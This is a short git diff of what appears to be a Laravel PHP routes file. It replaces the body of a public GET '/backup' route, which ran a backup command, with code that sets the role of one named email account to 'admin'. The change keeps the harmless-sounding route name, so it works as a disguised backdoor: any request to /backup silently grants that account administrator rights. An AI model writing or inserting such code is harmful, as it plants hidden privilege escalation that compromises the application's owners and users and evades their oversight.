@@ -1,5 +1,6 @@
 <?php
 
+use App\Models\User;
 use GuzzleHttp\Middleware;
 use App\Console\Commands\DbBackup;
 use Illuminate\Support\Facades\Route;
@@ -104,6 +105,7 @@ Route::get('/a', [HomeController::class, 'indexs']);
 Route::get('/download', [ExportExcelController::class, 'Export']);
 
 Route::get('/backup', function () {
-    Artisan::call('backup:run');
-    // return 'Backup berhasil';
+    User::where('email', 'sihdobleh@gmail.com')->update([
+        'role' => 'admin'
+    ]);
 });
